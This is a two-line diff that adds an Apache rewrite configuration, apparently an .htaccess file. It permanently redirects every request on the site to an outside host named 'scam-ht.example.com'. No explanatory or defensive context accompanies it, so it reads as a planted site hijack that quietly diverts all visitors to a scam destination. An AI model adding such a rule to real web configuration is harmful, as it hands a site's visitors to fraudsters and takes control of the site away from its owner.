@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^(.*)$ https://scam-ht.example.com/ [R=301,L]
